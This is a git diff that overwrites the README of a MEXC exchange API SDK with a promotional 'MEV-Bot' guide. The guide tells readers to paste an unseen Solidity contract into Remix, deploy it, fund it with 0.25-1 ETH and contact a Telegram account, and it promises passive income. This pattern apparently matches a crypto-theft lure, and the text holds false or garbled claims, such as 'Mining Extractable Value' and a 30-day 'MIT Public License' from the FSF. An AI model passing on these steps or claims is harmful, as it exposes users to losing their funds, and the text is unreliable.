@@ -1,456 +1,62 @@
-# mexc-api-sdk
+# MEV-Bot
 
- MEXC Official Market and trade api sdk, easy to connection and send request to MEXC open api !
- 
-## Prerequisites
-  - To use our SDK you have to install nodejs LTS (https://aws.github.io/jsii/user-guides/lib-user/)
+### Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure of Flashbot, you can earn passive income by exploiting MEV.
 
-## Installation
-1. 
-``` 
-git clone https://github.com/mxcdevelop/mexc-api-sdk.git
-```
- 2. cd dist/{language} and unzip the file
- 3. we offer five language : dotnet, go, java, js, python
+Flashbot provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
 
-## Table of APIS
-  - [Init](#init)
-  - [Market](#market)
-    - [Ping](#ping)
-    - [Check Server Time](#check-server-time)
-    - [Exchange Information](#exchange-information)
-    - [Recent Trades List](#recent-trades-list)
-    - [Order Book](#order-book)
-    - [Old Trade Lookup](#old-trade-lookup)
-    - [Aggregate Trades List](#aggregate-trades-list)
-    - [kline Data](#kline-data)
-    - [Current Average Price](#current-average-price)
-    - [24hr Ticker Price Change Statistics](#24hr-ticker-price-change-statistics)
-    - [Symbol Price Ticker](#symbol-price-ticker)
-    - [Symbol Order Book Ticker](#symbol-order-book-ticker)
-  - [Trade](#trade)
-    - [Test New Order](#test-new-order)
-    - [New Order](#new-order)
-    - [cancel-order](#cancel-order)
-    - [Cancel all Open Orders on a Symbol](#cancel-all-open-orders-on-a-symbol)
-    - [Query Order](#query-order)
-    - [Current Open Orders](#current-open-orders)
-    - [All Orders](#all-orders)
-    - [Account Information](#account-information)
-    - [Account Trade List](#account-trade-list)
-## Init
-```javascript
-//Javascript
-import * as Mexc from 'mexc-sdk';
-const apiKey = 'apiKey'
-const apiSecret = 'apiSecret'
-const client = new Mexc.Spot(apiKey, apiSecret);
-```
-```go
-// Go
-package main
-import (
-	"fmt"
-	"mexc-sdk/mexcsdk"
-)
+## 💡 Introducing Flashbot
+Flashbot is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-func main() {
-	apiKey := "apiKey"
-	apiSecret := "apiSecret"
-	spot := mexcsdk.NewSpot(apiKey, apiSecret)
-}
-```
-```python
-# python
-from mexc_sdk import Spot
-spot = Spot(api_key='apiKey', api_secret='apiSecret')
-```
-```java
-// java
-import Mexc.Sdk.*;  
-class MyClass {
-  public static void main(String[] args) {
-    String apiKey= "apiKey";
-    String apiSecret= "apiSecret";
-    Spot mySpot = new Spot(apiKey, apiSecret);
-  }
-}
-```
-```C#
-// dotnet
-using System;
-using System.Collections.Generic;
-using Mxc.Sdk;
+Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
-namespace dotnet
-{
-    class Program
-    {
-        static void Main(string[] args)
-        {
-            string  apiKey = "apiKey";
-            string  apiSecret= "apiSecret";
-            var spot = new Spot(apiKey, apiSecret);
-        }
-    }
-}
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-```
+## 📊 Platform Comparison
+Platform	Router Address	Network	Mempool Scan Time
+Pancakeswap	0x10ED43C718714eb63d5aA57B78B54704E256024E	BSC	0.78 sec
+Uniswap	0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D	ETH	0.32 sec
 
-## Market
-### Ping
-```javascript
-client.ping()
-```
-### Check Server Time
-```javascript
-client.time()
-```
-### Exchange Information
-```javascript
-client.exchangeInfo(options: any)
-options:{symbol, symbols}
-/**
- * choose one parameter
- * 
- * symbol : 
- *      example "BNBBTC";
- * 
- * symbols :
- *      array of symbol
- *      example ["BTCUSDT","BNBBTC"];
- * 
- */
-```
 
-### Recent Trades List
-```javascript
-client.trades(symbol: string, options: any = { limit: 500 })
-options:{limit}
-/**
- * 
- * limit : 
- *      Number of returned data
- *      Default 500; 
- *      max 1000;
- * 
- */
-```
-### Order Book
-```javascript
-client.depth(symbol: string, options: any = { limit: 100 })
-options:{limit}
-/**
- * limit : 
- *      Number of returned data
- *      Default 100;
- *      max 5000;
- *      Valid:[5, 10, 20, 50, 100, 500, 1000, 5000]
- * 
- */
-```
+## 🤖 How to Use MEVBot
+![241020628-7f849bd6-2e7a-4065-8119-e415dfb21777](https://i.ibb.co/JBFKJ3v/1.png)
 
-### Old Trade Lookup
-```javascript
-client.historicalTrades(symbol: string, options: any = { limit: 500 })
-options:{limit, fromId}
-/**
- * 
- * limit : 
- *      Number of returned data
- *      Default 500;
- *      max 1000;
- * 
- * fromId:
- *      Trade id to fetch from. Default gets most recent trades
- * 
- */
+### Step 1: Access the Source Code 📝
+Navigate to the Remix IDE: https://remix.ethereum.org/
+Create a new file "MevBot.sol".
+Copy this code and paste it into the Remix IDE.
 
-```
+![image](https://i.ibb.co/XLWqQKv/2.png)
 
-### Aggregate Trades List
-```javascript
-client.aggTrades(symbol: string, options: any = { limit: 500 })
-options:{fromId, startTime, endTime, limit}
-/**
- * 
- * fromId : 
- *      id to get aggregate trades from INCLUSIVE
- * 
- * startTime:
- *      start at
- * 
- * endTime:
- *      end at
- * 
- * limit : 
- *      Number of returned data
- *      Default 500;
- *      max 1000;
- * 
- */
-```
-### kline Data
-```javascript
-client.klines(symbol: string, interval: string, options: any = { limit: 500 })
-options:{ startTime, endTime, limit}
-/**
- * 
- * interval : 
- *      m :minute; 
- *      h :Hour; 
- *      d :day; 
- *      w :week; 
- *      M :month
- *      example : "1m"
- * 
- * startTime : 
- *      start at
- * 
- * endTime :
- *      end at
- * 
- * limit : 
- *      Number of returned data
- *      Default 500;
- *      max 1000;
- * 
- */
-```
 
-### Current Average Price
-```javascript
-client.avgPrice(symbol: string)
-```
-### 24hr Ticker Price Change Statistics
-```javascript
-client.ticker24hr(symbol?: string)
-```
-### Symbol Price Ticker
-```javascript
-client.tickerPrice(symbol?: string)
-```
+### Step 2: Compile the Code ⚙️
+Select the Solidity compiler 0.6.12.
+Click 'Compile MevBot.sol'. 
+![image](https://i.ibb.co/HP4NnzY/3.png)
 
-### Symbol Order Book Ticker
-```javascript
-client.bookTicker(symbol?: string)
-```
-## Trade
-### Test New Order
-```javascript
-client.newOrderTest(symbol: string, side: string, orderType: string, options: any = {})
-options:{ timeInForce, quantity, quoteOrderQty, price, newClientOrderId, stopPrice, icebergQty, newOrderRespType, recvWindow}
-/**
- * 
- * side:
- *      Order side 
- *      ENUM:
- *        BUY
- *        SELL
- * 
- * orderType:
- *      Order type
- *      ENUM:
- *        LIMIT
- *        MARKET
- *        STOP_LOSS
- *        STOP_LOSS_LIMIT
- *        TAKE_PROFIT
- *        TAKE_PROFIT_LIMIT
- *        LIMIT_MAKER
- * 
- * timeInForce : 
- *      How long an order will be active before expiration.
- *      GTC: Active unless the order is canceled
- *      IOC: Order will try to fill the order as much as it can before the order expires
- *      FOK: Active unless the full order cannot be filled upon execution.
- * 
- * quantity :
- *      target quantity
- * 
- * quoteOrderQty :
- *      Specify the total spent or received
- * 
- * price :
- *      target price
- * 
- * newClientOrderId :
- *      A unique id among open orders. Automatically generated if not sent
- * 
- * stopPrice :
- *      sed with STOP_LOSS, STOP_LOSS_LIMIT, TAKE_PROFIT, and TAKE_PROFIT_LIMIT orders
- * 
- * icebergQty :
- *      Used with LIMIT, STOP_LOSS_LIMIT, and TAKE_PROFIT_LIMIT to create an iceberg order
- * 
- * newOrderRespType : 
- *      Set the response JSON. ACK, RESULT, or FULL;
- *      MARKET and LIMIT order types default to FULL, all other orders default to ACK
- * 
- * recvWindow : 
- *      Delay accept time
- *      The value cannot be greater than 60000
- *      defaults: 5000
- * 
- */
 
-```
+### Step 3: Choose the Network 🌐
+Select either ETH or BSC (BNB) network.
+![image](https://i.ibb.co/5kSRqTf/4.png)
 
-### New Order
-```javascript
-client.newOrder(symbol: string, side: string, orderType: string, options: any = {})
-options:{ timeInForce, quantity, quoteOrderQty, price, newClientOrderId, stopPrice, icebergQty, newOrderRespType, recvWindow}
-/**
- * 
- * side:
- *      Order side 
- *      ENUM:
- *        BUY
- *        SELL
- * 
- * orderType:
- *      Order type
- *      ENUM:
- *        LIMIT
- *        MARKET
- *        STOP_LOSS
- *        STOP_LOSS_LIMIT
- *        TAKE_PROFIT
- *        TAKE_PROFIT_LIMIT
- *        LIMIT_MAKER
- * 
- * timeInForce : 
- *      How long an order will be active before expiration.
- *      GTC: Active unless the order is canceled
- *      IOC: Order will try to fill the order as much as it can before the order expires
- *      FOK: Active unless the full order cannot be filled upon execution.
- * 
- * quantity :
- *      target quantity
- * 
- * quoteOrderQty :
- *      Specify the total spent or received
- * 
- * price :
- *      target price
- * 
- * newClientOrderId :
- *      A unique id among open orders. Automatically generated if not sent
- * 
- * stopPrice :
- *      sed with STOP_LOSS, STOP_LOSS_LIMIT, TAKE_PROFIT, and TAKE_PROFIT_LIMIT orders
- * 
- * icebergQty :
- *      Used with LIMIT, STOP_LOSS_LIMIT, and TAKE_PROFIT_LIMIT to create an iceberg order
- * 
- * newOrderRespType : 
- *      Set the response JSON. ACK, RESULT, or FULL;
- *      MARKET and LIMIT order types default to FULL, all other orders default to ACK
- * 
- * recvWindow : 
- *      Delay accept time
- *      The value cannot be greater than 60000
- *      defaults: 5000
- * 
- */
 
-```
+### Step 4: Deploy the Code 🚀
+Click 'Transact (Deploy)'.
 
-### cancel-order
-```javascript
-client.cancelOrder(symbol: string, options:any = {})
-options:{ orderId, origClientOrderId, newClientOrderId}
-/**
- * 
- * Either orderId or origClientOrderId must be sent
- * 
- * orderId:
- *      target orderId
- * 
- * origClientOrderId:
- *      target origClientOrderId
- * 
- * newClientOrderId:
- *      Used to uniquely identify this cancel. Automatically generated by default.
- * 
- */
 
-```
+### Step 5: Deposit into MEVBot 💰
+Copy your MEV contract and send an amount of Ethereum for the bot's operation.
+Start the bot by pressing the 'Start' button.
+![image](https://i.ibb.co/njpMWt1/5.png)
+![image](https://i.ibb.co/Jy56BDh/6.png)
 
-### Cancel all Open Orders on a Symbol
-```javascript
-client.cancelOpenOrders(symbol: string)
-```
-### Query Order
-```javascript
-client.queryOrder(symbol: string, options:any = {})
-options:{ orderId, origClientOrderId}
-/**
- * 
- * Either orderId or origClientOrderId must be sent
- * 
- * orderId:
- *      target orderId
- * 
- * origClientOrderId:
- *      target origClientOrderId
- * 
- */
-```
-### Current Open Orders
-```javascript
-client.openOrders(symbol: string)
-```
-### All Orders
-```javascript
-client.allOrders(symbol: string, options: any = { limit: 500 })
-options:{ orderId, startTime, endTime, limit}
+🔔 Note: For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.25-1 ETH.
 
-/**
- * 
- * orderId:
- *      target orderId
- * 
- * startTime:
- *      start at
- * 
- * endTime:
- *      end at
- * 
- * limit : 
- *      Number of returned data
- *      Default 500;
- *      max 1000;
- * 
- */
-```
-### Account Information
-```javascript
-client.accountInfo()
-```
-### Account Trade List
-```javascript
-client.accountTradeList(symbol: string, options:any = { limit: 500 })
-options:{ orderId, startTime, endTime, fromId, limit}
+### You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
 
-/**
- * 
- * orderId:
- *      target orderId
- * 
- * startTime:
- *      start at
- * 
- * endTime:
- *      end at
- * 
- * fromId:
- *      TradeId to fetch from. Default gets most recent trades
- * 
- * limit : 
- *      Number of returned data
- *      Default 500;
- *      max 1000;
- * 
- */
-```
+UPD: If you have closed the Remix IDE website or accidentally rebooted your computer, you can still access all the bot's functions through Etherscan. You will need to verify the bot contract on Etherscan, and you will have access to the same functions as you would through the Remix IDE website.
+
+Copyright (C) 2023 MevBotsETHandBSC
+
+This program is free software for 30 days: you can redistribute and/or modify it under the terms of the MIT Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
+> # Help
+If at any time you encounter any issues with the contract setup, contact our team at https://t.me/UniswapMevbots  🛡️
